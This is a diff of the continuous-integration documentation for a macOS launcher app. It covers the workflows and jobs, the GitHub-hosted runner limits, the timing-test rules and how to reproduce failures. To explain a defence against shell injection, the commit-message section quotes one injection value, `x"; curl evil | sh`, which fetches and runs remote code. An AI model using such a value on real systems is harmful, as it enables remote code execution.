@@ -1,55 +1,100 @@
 # Continuous integration
 
-Everything that can run without a physical Mac runs on free GitHub-hosted runners (the repository is public, and standard hosted runners
-are free for public repositories, macOS included). The rest is listed in [What needs a physical Mac](#what-needs-a-physical-mac).
+The policy is in [TESTING.md](TESTING.md): **only unit and integration tests run on a developer's machine; everything else runs here, on
+free GitHub-hosted runners** (the repository is public, and standard hosted runners are free for public repositories, macOS included).
+This page describes the workflows, their jobs and the runners. What cannot run even here is listed in
+[What needs a physical Mac](#what-needs-a-physical-mac).
 
 | Workflow | Runs on | Jobs |
 |---|---|---|
-| `ci.yml` | every pull request and push to `main`; `workflow_dispatch` | `check`, `deny`, `lab-scripts`, `packaging`, `perf` |
-| `ci.yml` | manual runs with `stress=true` only | `stress` (macOS 15 and macOS 15 Intel), see [Timing-sensitive tests](#timing-sensitive-tests) |
-| `ci.yml` | pushes to `main` and manual runs only | `gui-smoke` (macOS 15 and 26), `x86-64` (macOS 15 Intel), `bundle` |
-| `commit-lint.yml` | every pull request (opened, edited, synchronize, reopened) | `commit-lint`, `hooks-tests` |
-| `nightly.yml` | every night 02:41 UTC; `workflow_dispatch` | `checklist` (macOS 15 and 26), `soak` (macOS 15) |
+| `ci.yml` | every pull request (opened, edited, synchronize, reopened) and push to `main`; `workflow_dispatch` | `check`, `deny`, `commit-lint`, `hooks`, `policy`, `packaging` |
+| `e2e.yml` | every pull request **from this repository** and push to `main`: `smoke` (macOS 15 and 26). Pushes to `main` also: `screenshots`, `x86-64` (macOS 15 Intel), `bundle`. Nightly 02:41 UTC: `checklist` (macOS 15 and 26). `workflow_dispatch`: any of them (`suite`, `ref`, `sections`) | `smoke`, `checklist`, `screenshots`, `focus`, `x86-64`, `bundle` |
+| `stress.yml` | nightly 03:41 UTC; `workflow_dispatch` (`suite`, `ref`, `runs`, `slow_runs`) | `ignored`, `timing` (macOS 15 and 15 Intel), `perf-gui`, `bench`, `test-times` |
+| `soak.yml` | nightly 04:41 UTC; `workflow_dispatch` (`soak_seconds`, `ref`) | `soak` |
 | `advisories.yml` | Mondays 06:17 UTC; `workflow_dispatch` | RustSec advisories for the locked dependencies |
-| `release.yml` | a pushed `v*` tag; `workflow_dispatch` builds and uploads but never creates a release | signed or ad-hoc universal build, draft release |
+| `release-preview.yml` | pull requests and pushes to `main` | the release a merge would produce; the tests of `scripts/release` |
+| `release.yml` | one-click release; see [RELEASING.md](RELEASING.md) | signed or ad-hoc universal build, draft release |
 
-Required status checks on `main`: `check` and `deny`.
+Required status checks on `main`: `check` and `deny`. `commit-lint` and `policy` are meant to join them (a maintainer adds them to the ruleset).
+Run any suite for your branch with `scripts/ci-run.sh <suite> --watch` ([TESTING.md](TESTING.md#on-ci-scriptsci-runsh)).
+
+**Pull requests from forks** run `ci.yml` only (cheap jobs, read-only token, no secrets). `e2e.yml` jobs are skipped for them on purpose: they
+drive a GUI session as an administrator on a hosted runner and write privacy-permission rows, and the first workflow run of a new
+contributor needs a maintainer's approval anyway. A maintainer pushes the branch to this repository to run the end-to-end suites.
 
 ## What each job does
 
-* **check** (macos-15): `scripts/check.sh` = `cargo fmt --check`, `cargo clippy -D warnings`, `cargo test --workspace`.
-* **perf** (macos-15): `cargo test --release -p ashdash-core -- --ignored perf_ --test-threads=1`, the absolute latency ceilings. See
-  [Timing-sensitive tests](#timing-sensitive-tests). Not a required status check.
+### `ci.yml` (cheap, every pull request)
+
+* **check** (macos-15): `scripts/check.sh`, the same gate as on a laptop: `cargo fmt --check`, `cargo clippy -D warnings`, `cargo test --workspace`
+  (non-ignored tests), `tests/hooks/commit-lint.test.sh`, `scripts/policy-check.sh` and `tests/policy/run-tests.sh`. The stage times are in the job
+  summary; the budget is raised to 15 minutes here (`CHECK_BUDGET_SECONDS`, honoured on CI only) because a cold cache is slower than a laptop.
 * **deny** (ubuntu): `cargo deny check licenses bans sources` (`deny.toml`). Advisories are deliberately not part of pull requests: a new
   RustSec entry for a crate a change does not touch would turn every pull request red. They run weekly in `advisories.yml`.
-* **lab-scripts** (macos-15): `tests/e2e/test/run-tests.sh`, the host tests of the lab scripts against a fake `tart` and `ssh`: slot
-  semaphore, `lab-with-vm`, the guards of `tests/e2e/guest/tcc-grant.sh` (including the CI mode) and of the CI wrappers, `finalize.py`.
-* **packaging** (macos-15): `packaging/selftest.sh`, `scripts/gen-notice.py --check` (NOTICE is up to date), and `tests/e2e/ci/lint.sh`:
-  shellcheck (warnings and errors) on every shell script in the repository and actionlint on the workflows. Both linters are downloaded as
-  pinned releases and verified against a SHA-256 in the workflow.
-* **gui-smoke** (macos-15, macos-26): `tests/e2e/ci/run-smoke.sh` = the lab's `tests/e2e/smoke.sh --quick` on the runner: debug build, native
+* **commit-lint** (ubuntu): the pull request title and every commit message ([below](#commit-messages)).
+* **hooks** (ubuntu): `tests/hooks/run-tests.sh`, the tests of the validator and of the git hooks in throw-away repositories (about 40 s of real
+  commits, too long for the local gate, which runs the validator tests only).
+* **policy** (ubuntu): `scripts/policy-check.sh --list-allowed` and `tests/policy/run-tests.sh` (the policy check against its own negative cases, and
+  `scripts/ci-run.sh` in dry-run mode). Static, seconds. See [TESTING.md](TESTING.md#what-the-policy-check-rejects).
+* **packaging** (macos-15): `packaging/selftest.sh`, `scripts/gen-notice.py --check` (NOTICE is up to date), `scripts/ci/lint.sh` (shellcheck
+  warnings and errors on every shell script in the repository and actionlint on the workflows; both are downloaded as pinned releases and verified
+  against a SHA-256 in the workflow), and `tests/e2e/test/run-tests.sh`, the host tests of the e2e scripts: the guards of `tcc-grant.sh` and of the CI
+  wrappers (they must refuse outside a hosted runner), `finalize.py`, `retry-sections.py`. No GUI.
+
+### `e2e.yml` (end-to-end; they take over the runner's GUI session)
+
+* **smoke** (macos-15, macos-26): `tests/e2e/ci/run-smoke.sh` = `tests/e2e/smoke.sh --quick` on the runner: debug build, native
   `Ashdash.app` with `packaging/build-app.sh`, launch in the GUI session, `ashdash show/search/query`, the `ashdash://` scheme, the global
   hotkey Option+Shift+Space through System Events (the window must toggle), window state read back as text, a screenshot, login item
-  enable/status/disable, `quit`. `scripts/check.sh` is not repeated (the `check` job does it).
-* **x86-64** (macos-15-intel): `cargo test --workspace`, `cargo build -p ashdash`, and the same GUI smoke test as above with the native x86-64 bundle. **GitHub retires the
-  `macos-15-intel` image in August 2027**; it is the last Intel hosted runner. After that, x86-64 is only built (the `bundle` job
-  cross-compiles the x86-64 slice on arm64) and never executed in CI; its tests need a physical Intel Mac. Delete this job when the label
-  stops working.
+  enable/status/disable, `quit`. `scripts/check.sh` is not repeated (the `check` job does it). It runs for every pull request from this
+  repository, so a change is validated before it is merged; 2 to 3 minutes warm.
+* **checklist** (macos-15, macos-26; nightly and on demand): `tests/e2e/ci/run-checklist.sh` = `qa/prep.sh` (grants, native bundle, install to
+  `/Applications`) + `qa/checklist.sh` (all sections: hotkey and window, search, keys, focus, clipboard and snippets, workflows, permissions,
+  preferences, actions panel, measurements, the later behaviours) + `tests/e2e/ci/finalize.py`. About 140 rows; a run takes about 22 minutes. The
+  dispatch input `sections` runs some of the sections only (`s31 s32`).
+* **screenshots** (macos-15; pushes to `main` and on demand): `tests/e2e/ci/run-screenshots.sh` = `tests/e2e/screenshots/prefs-shots.sh`: the
+  real preferences window, every page, dark and light, at two window sizes, plus the recorder states, the Tab focus ring, Cmd+K and Cmd+R.
+  The images are the artifact `preferences-screenshots` (7 days). Nothing compares them with reference images; a person looks at them.
+* **focus** (macos-15; on demand): `tests/e2e/ci/run-focus.sh` = `tests/e2e/focus/regress.sh`: the launcher must hide when another app takes the focus,
+  survive Quick Look and the actions panel, and stay up on a click ([spikes/ui-focus.md](spikes/ui-focus.md)).
+* **x86-64** (macos-15-intel): `cargo test --workspace`, `cargo build -p ashdash`, and the same GUI smoke test with the native x86-64 bundle.
+  **GitHub retires the `macos-15-intel` image in August 2027**; it is the last Intel hosted runner. After that, x86-64 is only built (the
+  `bundle` job cross-compiles the x86-64 slice on arm64) and never executed in CI; its tests need a physical Intel Mac. Delete this job when
+  the label stops working.
 * **bundle** (macos-15): `packaging/build-app.sh` (universal arm64 + x86_64, ad-hoc signed) and `packaging/make-dmg.sh`, then
   `tests/e2e/ci/verify-bundle.sh`: both architectures present, `codesign --verify --deep --strict`, `plutil -lint`, the DMG checksum and
   `hdiutil verify`, the app inside the mounted image, and the bundled binary starts. The DMG and its checksum are uploaded as a workflow
   artifact for 7 days (not a release).
-* **checklist** (nightly): `tests/e2e/ci/run-checklist.sh` = `qa/prep.sh` (grants, native bundle, install to `/Applications`) +
-  `qa/checklist.sh` (all sections: hotkey and window, search, keys, focus, clipboard and snippets, workflows, permissions, preferences,
-  actions panel, measurements, the later behaviours) + `tests/e2e/ci/finalize.py`. About 140 rows; a run takes about 22 minutes.
-* **soak** (nightly): `tests/e2e/ci/run-soak.sh` = `qa/soak.sh` for 7200 s (the 2-hour version of the lab): show, type, hide every 30 s,
-  sample RSS, footprint, CPU time, threads and open files every 5 minutes, count crash reports, check the hotkey at the end. The dispatch
-  input `soak_seconds` shortens it. A hosted job may run for up to 6 hours; the job limit here is 5.
 
-Logs, results and screenshots are uploaded as artifacts **only when a job fails** (7 days). Screenshots of green runs are deleted before the
-job ends. The job summary page of every run has the report (smoke stages, checklist rows that are not PASS, soak samples).
+### `stress.yml` (resources and time; nightly and on demand)
 
-## Commit messages: `commit-lint.yml`
+* **ignored** (macos-15): `scripts/ci/run-ignored.sh`: every `#[ignore = "ci: ..."]` Rust test in **release mode**, one at a time
+  (`cargo test --release --workspace -- --ignored --test-threads=1`), which includes the real-pasteboard, Finder, `osascript`, Spotlight and
+  `ditto` tests and the absolute latency ceilings (`perf_*`), then the fuzz suites at their full case counts (`ASHDASH_FUZZ_FULL=1`). A test that
+  cannot work on a hosted runner is skipped by name in the script, with the reason.
+* **timing** (macos-15 and macos-15-intel): `scripts/ci/stress-timing.sh`, see [Timing-sensitive tests](#timing-sensitive-tests). Nightly: 20 runs per
+  test (5 for the slow ones); a dispatch defaults to 100 and 40.
+* **perf-gui** (macos-15): `tests/e2e/ci/run-perf-gui.sh` runs `scripts/qa/perf-gui.sh` on the release binary inside the GUI session: cold and
+  warm start-up (socket, hotkey ready, first window), hotkey and `ashdash show` latency, idle CPU, RSS and footprint with the window hidden,
+  memory after 20 show/type/hide cycles, for an empty, a real and a 5,000-app configuration. The table is in the job summary
+  (`tests/e2e/ci/perf-summary.py`), `results.jsonl` and the `footprint`/`vmmap` dumps are the artifact `perf-gui`. A shared 3-core virtual machine says
+  nothing about absolute numbers on a Mac; compare runs of the same image over time ([PERF.md](PERF.md)).
+* **bench** (macos-15): `scripts/ci/run-bench.sh`: `cargo bench -p ashdash-core --bench report` (p95 query latency at 500 and 5,000 apps, cold
+  start with and without the index cache, idle CPU of the engine) and the criterion benchmark `queries`. Output in the job summary and the artifact `bench`.
+* **test-times** (macos-15, debug and release-with-ignored): `scripts/ci/test-times.sh` runs every test alone and lists the slowest. This is
+  the data behind the classification of the tests ([TESTING.md](TESTING.md#how-tests-are-classified)).
+
+### `soak.yml`
+
+* **soak** (macos-15): `tests/e2e/ci/run-soak.sh` = `qa/soak.sh` for 7200 s (the 2-hour version): show, type, hide every 30 s, sample RSS,
+  footprint, CPU time, threads and open files every 5 minutes, count crash reports, check the hotkey at the end. The dispatch input
+  `soak_seconds` shortens it. A hosted job may run for up to 6 hours; the job limit here is 5.
+
+Logs, results and screenshots are uploaded as artifacts **only when a job fails**, except for the jobs whose result is the artifact
+(`screenshots`, `bundle`, `perf-gui`, `bench`, `test-times`); all expire after 7 days. Screenshots of green e2e runs are deleted before the job ends.
+The job summary page of every run has the report (smoke stages, checklist rows that are not PASS, soak samples, performance tables).
+
+## Commit messages
 
 Pull requests are squash-merged, so the pull request title becomes the commit on `main` and the release version is computed from it
 ([RELEASING.md](RELEASING.md)). The `commit-lint` job (ubuntu, about 10 s) runs `scripts/commit-lint.sh` twice: on the **title**
@@ -57,11 +102,9 @@ Pull requests are squash-merged, so the pull request title becomes the commit on
 both with `--forbid-names`. The rules are in [CONTRIBUTING.md](../CONTRIBUTING.md#commit-messages-and-pull-requests); they run locally as
 git hooks too, and CI repeats them because hooks can be skipped. The title, the base branch and the head SHA reach the shell only through
 environment variables, never through `${{ }}` in a command line (a title like `x"; curl evil | sh` is just text). Editing the title re-runs
-the job (`edited`). Dependabot pull requests get a header limit of 120 instead of 72 (its group titles are longer and cannot be shortened).
-The second job, `hooks-tests`, runs `tests/hooks/run-tests.sh` (the validator and the hooks, in throw-away repositories) on Linux, which keeps the
-scripts portable; on macOS the same tests run inside `scripts/check.sh`. Reproduce locally: `scripts/commit-lint.sh --title "..."`,
-`scripts/commit-lint.sh --range origin/main..HEAD`, `tests/hooks/run-tests.sh`. `commit-lint` is not a required status check until a
-maintainer adds it to the ruleset.
+`ci.yml` for the `edited` event, in a concurrency group of its own, and every job except `commit-lint` is skipped for it. Dependabot pull
+requests get a header limit of 120 instead of 72 (its group titles are longer and cannot be shortened). Reproduce locally:
+`scripts/commit-lint.sh --title "..."`, `scripts/commit-lint.sh --range origin/main..HEAD`, `tests/hooks/run-tests.sh`.
 
 ## Pins
 
@@ -86,9 +129,9 @@ Security rules for the public repository: workflows run on `pull_request` (never
 (`permissions: contents: read`; only the draft-release step of `release.yml` gets `contents: write`), there are no secrets in the pull
 request workflows, checkouts do not persist credentials, every job has a `timeout-minutes`, and a `concurrency` group cancels superseded runs.
 
-## What a hosted runner is, and how it differs from the lab VM
+## What a hosted runner is
 
-A spike on 2026-10-18 (all three images, same commit) established that a hosted macOS runner is the same kind of machine as a lab clone:
+A spike on 2026-10-18 (all three images, same commit) established what a hosted macOS runner is:
 
 | | `macos-15` | `macos-26` | `macos-15-intel` |
 |---|---|---|---|
@@ -107,28 +150,27 @@ A spike on 2026-10-18 (all three images, same commit) established that a hosted 
 | Launch the bundle in the GUI session | yes, window visible | yes | yes |
 | Global hotkey through System Events | toggles the launcher (1 window -> 0) | same | same |
 | `ashdash://` through `open` | handler registered with `lsregister`, `open` returns 0 | same | same |
-| `tests/e2e/guest/tcc-grant.sh` (CI mode) | accepted (VirtualMac, user `runner`) | accepted | refused: the model is not `VirtualMac*`; not needed, the grants exist already |
+| `tests/e2e/guest/tcc-grant.sh` | accepted (VirtualMac, user `runner`) | accepted | refused: the model is not `VirtualMac*`; not needed, the grants exist already |
 | Spotlight | on, indexes slowly | on | on |
 
-Differences from the lab VM (macOS 15 on Tart) that matter for results:
+What matters for results:
 
-* **Spotlight is on** here and off in the lab. Rows that the lab marks BLOCKED because `mdfind` is empty (3.2.8c, 3.9.2, 3.11.3) can run,
-  but a file created seconds ago is not indexed yet: `checklist.sh` waits up to 60 s for its fixture before asking.
+* **Spotlight is on**, but a file created seconds ago is not indexed yet: `checklist.sh` waits up to 60 s for its fixture before asking.
 * **Smaller display** (1024 x 768 on arm64). Any check that looks for a window of at least a given size sees the launcher's hidden full-size window
-  as well. See the two open rows below.
-* **Three cores, 7 GB**, shared hardware: timings are noisier than on the lab host. A unit test that slept for 30 ms and required the clock
-  not to pass 80 ms failed on every arm64 runner; it was loosened (see "Findings while bringing CI up"), and later rewritten so that no
-  test depends on the speed of the machine (see [Timing-sensitive tests](#timing-sensitive-tests)).
+  as well.
+* **Three cores, 7 GB**, shared hardware: timings are noisy. A unit test that slept for 30 ms and required the clock not to pass 80 ms failed on
+  every arm64 runner; no test depends on the speed of the machine any more (see [Timing-sensitive tests](#timing-sensitive-tests)).
 * **Pre-granted privacy permissions.** The hosted image grants Accessibility, Automation and Screen Recording to the tools the scripts use, so
-  the first-use consent dialogs the lab sees do not appear. `tcc-grant.sh` still runs (it adds the Terminal and `osascript` rows the
-  scripts rely on), and the "no TCC rows for the app" paths are as exercised as in the lab: nothing is granted to Ashdash itself.
+  first-use consent dialogs do not appear. `tcc-grant.sh` still runs (it adds the Terminal and `osascript` rows the scripts rely on), and
+  nothing is granted to Ashdash itself, so the "no TCC rows for the app" paths are exercised.
 * **Image content.** Firefox, Chrome, Edge and PowerShell are present as bundles, Visual Studio Code is not (3.2.1b stays BLOCKED),
   and `/Applications/Safari.app` is a symlink into a cryptex.
 * The runner is thrown away after the job: nothing the scripts write (login item, TCC rows, `/Applications/Ashdash.app`) survives.
 
-The scripts that drive the keyboard, the screen and the hotkey (`run-smoke.sh`, `run-checklist.sh`, `run-soak.sh`) refuse to run unless
+The scripts that drive the keyboard, the screen and the hotkey (`run-smoke.sh`, `run-checklist.sh`, `run-soak.sh`, `run-screenshots.sh`, `run-perf-gui.sh`) refuse to run unless
 `GITHUB_ACTIONS=true`, `RUNNER_ENVIRONMENT=github-hosted`, the account is `runner` and it owns the console. `tcc-grant.sh` additionally
-requires a `VirtualMac*` model, so exporting the variables on a developer's Mac changes nothing (host tests: `tests/e2e/test/run-tests.sh`).
+requires a `VirtualMac*` model, so exporting the variables on a developer's Mac changes nothing (host tests: `tests/e2e/test/run-tests.sh`, job `packaging`).
+The QA scripts under `scripts/qa/` that drive the desktop (`gui-smoke.sh`, `ui-glue-smoke.sh`, `perf-gui.sh`) source `scripts/qa/require-ci.sh` and refuse the same way.
 
 ## Timing-sensitive tests
 
@@ -139,29 +181,31 @@ this way: 166 ms against a 150 ms ceiling, and a 25 ms ceiling at 5,000 apps). T
 * **Never compare a time with a constant to guard performance.** Count work (`crate::testperf::allocations_in`: allocations are exact and
   identical on every machine) or compare the code with itself on a small and a large input in the same test (`testperf::best_of_pair`:
   interleaved rounds, the least CPU time of the thread in each; wall-clock time is not used because a long run is interrupted far more often than a short one on a busy machine, which skews the ratio; a linear algorithm costs about 10x for 10x the input, a quadratic one 100x).
-* **Absolute ceilings live in `perf_*` tests** that are `#[ignore]`d in the normal run and start with `testperf::require_release()`. The
-  `perf` job runs them in release mode: `cargo test --release -p ashdash-core -- --ignored perf_ --test-threads=1`. Run the same command
-  locally before changing a hot path. The ceilings keep a 5x or larger margin over the numbers in [PERF.md](PERF.md).
+* **Absolute ceilings live in `perf_*` tests** that are `#[ignore = "ci: ..."]`d in the normal run and start with `testperf::require_release()`. The
+  `ignored` job of `stress.yml` runs them in release mode (`scripts/ci-run.sh ignored`). They are not run on a developer's machine: a
+  wall-clock ceiling is performance work, which runs on CI. The ceilings keep a 5x or larger margin over the numbers in [PERF.md](PERF.md).
 * **Never sleep for a duration the test then depends on.** Wait for the condition: poll with short steps and a generous overall limit that
   only bounds a real failure (30 to 60 s). Where the code under test reads a clock (the bookmark back-off), the test passes a fake clock
   and advances it by hand. Where a handler must be "slow", block it on a gate that the test opens, and read what the handler did, not how
   long it took. The OS file watcher cannot be asked whether it is armed: repeat the edit until the report arrives.
 * **A bound on a hang is fine** (a script that sleeps 40 s must come back before 25 s; a parse that would run for hours must end within
-  30 s) as long as the limit sits at least 3x from both what the code normally takes and what a broken run would take.
+  30 s) as long as the limit sits at least 3x from both what the code normally takes and what a broken run would take. The policy check
+  accepts such a bound when it is 5 s or more; a smaller one needs a `policy-allow: clock` comment that says why it is a hang guard.
 * **A wait for something that must not happen** (`recv_timeout(..).is_err()`) can only make a test pass too easily, never fail; keep it
   short, and make sure the positive case before it proves the machinery is running.
 
-To see how these tests behave on a slow runner, dispatch `ci.yml` with the **`stress`** input (`gh workflow run ci.yml --ref <branch> -f stress=true -f target_ref=<branch, tag or full 40-character SHA>`). It
-runs `scripts/stress-timing.sh`: each formerly clock-dependent test 100 times in a row while four busy loops per CPU keep the runner
-saturated, on macOS 15 (arm64) and macOS 15 Intel, and fails if a single run fails; the table goes to the job summary. Do not do this on a
-developer machine: anything that saturates the CPUs runs in the pipeline. `target_ref` points the same script at older code, to prove that
-a test failed before a fix. Add new timing-sensitive tests to the list in the script.
+To see how these tests behave on a slow runner, run the **`timing`** suite: `scripts/ci-run.sh timing --watch [--runs 100 --slow-runs 40]
+[--target <branch, tag or full 40-character SHA>]`. It runs `scripts/ci/stress-timing.sh`: each formerly clock-dependent test many times in a row
+while four busy loops per CPU keep the runner saturated, on macOS 15 (arm64) and macOS 15 Intel (tests that are `#[ignore = "ci: ..."]` are run
+with `--include-ignored`), and fails if a single run fails; the table goes to the job summary. Anything that saturates the CPUs runs in the
+pipeline, never on a developer machine. `--target` points the same script at older code, to prove that a test failed before a fix. Add new
+timing-sensitive tests to the list in the script.
 
 ## Rows that differ or cannot run: `tests/e2e/ci/blocked.tsv`
 
 `finalize.py` turns a **FAIL** into **BLOCKED** with the reason only for rows listed in `tests/e2e/ci/blocked.tsv` (optionally for one
-image); a PASS stays a PASS and every other FAIL fails the job. The BLOCKED and NEEDS-OWNER rows that `checklist.sh` itself reports are the
-same ones as in the lab (no second display, display sleep locks the session, restart/logout/lock would end the session, no network switch,
+image); a PASS stays a PASS and every other FAIL fails the job. The BLOCKED and NEEDS-OWNER rows that `checklist.sh` itself reports are
+the ones a virtual machine cannot do (no second display, display sleep locks the session, restart/logout/lock would end the session, no network switch,
 Full Disk Access is not enforced with SIP off, nothing to type with an IME, ...).
 
 Rows that fail only sometimes are not hidden either: a GUI check on a shared 3-core virtual machine can miss its timing. When the first
@@ -187,7 +231,7 @@ runner cannot give.
 * **Latency tests on the Intel runner.** `scoring_thousands_of_bookmarks_per_keystroke_stays_cheap` (p95 166 ms against 150 ms) and
   `query_latency_p95_at_5000_apps_stays_under_the_ceiling` failed in the `x86-64` job. Both are now machine-independent (allocation counts
   and scaling ratios), with the absolute ceilings as release-mode `perf_*` tests; see [Timing-sensitive tests](#timing-sensitive-tests).
-* **Checklist row 3.2.8c never ran in the lab** (Spotlight is off there). On a runner it exposed that the script created its fixture outside
+* **Checklist row 3.2.8c never ran in the retired VM lab** (Spotlight was off there). On a runner it exposed that the script created its fixture outside
   the home folder the launcher searches; the fixture is now created there and the script waits for Spotlight to index it.
 * **`advisories.yml` is red:** `cargo deny check advisories` reports the yanked crate `inout 0.2.3` (dependency path `ashdash-core` -> `zip 9.0.3`
   -> `aes 0.9.3` -> `cipher 0.5.2` -> `inout`). Fixing it means changing `Cargo.lock` (or pinning a different `zip`), which this work does not do.
@@ -195,40 +239,32 @@ runner cannot give.
 
 ## Typical durations
 
-Measured on the proof runs of 2026-10-18 (warm `rust-cache`; a cold cache adds 3 to 20 minutes, most on the Intel image):
+Measured on the proof runs of 2026-10-18 (warm `rust-cache`; a cold cache adds 3 to 20 minutes, most on the Intel image). The durations of the
+runs that validated the restructuring are in the pull request that introduced it.
 
 | Job | Time |
 |---|---|
 | `deny` | 0.5 min |
 | `packaging` | 0.5 min |
-| `lab-scripts` | 2 min |
+| `policy` | under 1 min |
 | `check` | 2 min |
-| `gui-smoke` (macOS 15 / 26) | 2 to 3 min |
+| `smoke` (macOS 15 / 26) | 2 to 3 min |
 | `bundle` | 3.5 to 4 min |
 | `x86-64` (build, tests and GUI smoke) | 6 to 8 min (25 min cold) |
-| whole `ci.yml` run on `main` | about 10 min wall clock when the five-macOS-job limit does not queue anything |
 | `checklist` (macOS 15 / 26) | 20 / 23 min (including the build, and the second pass when there is one) |
 | `soak`, 7200 s | 2 h 2 min (240 cycles, no missed hotkey, no crash) |
 
-## Reproducing a CI failure locally
+## Reproducing a CI failure
 
-1. Download the artifact of the failed job (`gh run download <run-id> -n <name>`): `smoke-report.txt` / `results.tsv` / `results-final.tsv`,
-   the logs and the screenshots of the failed steps.
-2. Run the same script in a lab VM (see [LAB.md](LAB.md)); the CI wrappers are thin: they set the artifact folder, call the lab script and
-   post-process the results.
-
-   ```sh
-   vm=$(tests/e2e/lab-up --id repro --max-age 14400 | cut -d' ' -f1)
-   tests/e2e/lab-run "$vm" -- bash tests/e2e/smoke.sh --quick                 # what gui-smoke runs
-   tests/e2e/lab-run "$vm" -- bash tests/e2e/qa/prep.sh                       # what run-checklist.sh runs, step 1
-   tests/e2e/lab-run "$vm" -- bash tests/e2e/qa/checklist.sh s31 s32          # a few sections only
-   tests/e2e/lab-down "$vm"
-   ```
-3. `workflow_dispatch` runs a workflow from any branch of this repository: `gh workflow run ci.yml --ref <branch>`. (A *new* workflow file
-   can only be dispatched once it exists on `main`; until then trigger it with a pull request or a temporary `push` trigger on a scratch branch.)
-   `nightly.yml` takes `soak_seconds` and `sections` as inputs: `gh workflow run nightly.yml -f soak_seconds=600 -f sections="s31 s32"`.
-4. The hosted-runner specifics (screen size, Spotlight, image content) cannot be reproduced in the Tart lab. To see the real thing, dispatch
-   the workflow, or run `tests/e2e/ci/lint.sh` and `tests/e2e/test/run-tests.sh` on your Mac for the parts that need no GUI.
+1. Download the artifact of the failed job: `scripts/ci-run.sh <suite> --watch --download out`, or `gh run download <run-id> -n <name>`:
+   `smoke-report.txt` / `results.tsv` / `results-final.tsv`, the logs and the screenshots of the failed steps.
+2. Fix, push, and run the same suite again: `scripts/ci-run.sh smoke --watch`. A few sections of the checklist: `scripts/ci-run.sh checklist
+   --sections "s31 s32" --watch`. There is no local virtual machine and no local GUI run; the loop is push, run, read.
+3. `workflow_dispatch` runs a workflow from any branch of this repository: `gh workflow run e2e.yml --ref <branch> -f suite=smoke`. (A *new*
+   workflow file can only be dispatched once it exists on `main`; until then trigger it with a pull request or a temporary `push` trigger on a
+   scratch branch.)
+4. The parts that need no GUI run on your Mac too: `scripts/ci/lint.sh` (needs shellcheck and actionlint), `tests/e2e/test/run-tests.sh`,
+   `tests/policy/run-tests.sh`.
 
 ## What needs a physical Mac
 
@@ -242,14 +278,14 @@ hardware after August 2027.
 
 * Standard GitHub-hosted runners (all labels used here are standard) are free and not metered for public repositories. If the repository
   were made private, macOS minutes would be billed at a multiple of the Linux rate and the nightly soak alone would use about 250 macOS
-  minutes a day; at that point move `nightly.yml` to a weekly schedule.
+  minutes a day; at that point move the nightly workflows to a weekly schedule.
 * A pull request from a fork runs `ci.yml` with a read-only token and no secrets, on this repository's runner capacity; the first
-  workflow run of a new contributor needs a maintainer's approval. It runs only the cheap jobs (`check`, `deny`, `lab-scripts`,
-  `packaging`); the GUI jobs, `x86-64`, `bundle` and the nightly workflow never run for a fork's pull request.
+  workflow run of a new contributor needs a maintainer's approval. It runs only the cheap jobs of `ci.yml` (`check`, `deny`, `commit-lint`,
+  `hooks`, `policy`, `packaging`); `e2e.yml`, `stress.yml` and `soak.yml` never run for a fork's pull request.
 * In a fork, scheduled workflows are disabled until the fork owner enables them, and a push to the fork's `main` runs the push jobs on
   the fork owner's account: free if the fork is public, metered if it is private.
 * **Capacity.** A free account may run 20 jobs at once, at most 5 of them on macOS ([Actions limits](https://docs.github.com/en/actions/reference/limits)).
-  A push to `main` starts 7 macOS jobs and the nightly workflow 3, so some wait in the queue; the nightly schedule is at a time with no
-  pushes expected. Cache storage is limited to 10 GB per repository and artifact storage to 500 MB on a free organisation account:
-  artifacts are kept for 7 days and only the bundle and failures are uploaded.
+  A push to `main` starts about 7 macOS jobs (`check`, `packaging`, two `smoke`, `screenshots`, `x86-64`, `bundle`) and the nightly workflows more, so
+  some wait in the queue; the nightly schedules are at times with no pushes expected and are an hour apart. Cache storage is limited to 10 GB per repository and artifact storage to 500 MB on a free organisation account:
+  artifacts are kept for 7 days and only results (bundle, screenshots, performance numbers) and failures are uploaded.
 * Superseded runs are cancelled (`concurrency`), so a quick series of pushes costs one run, not many.
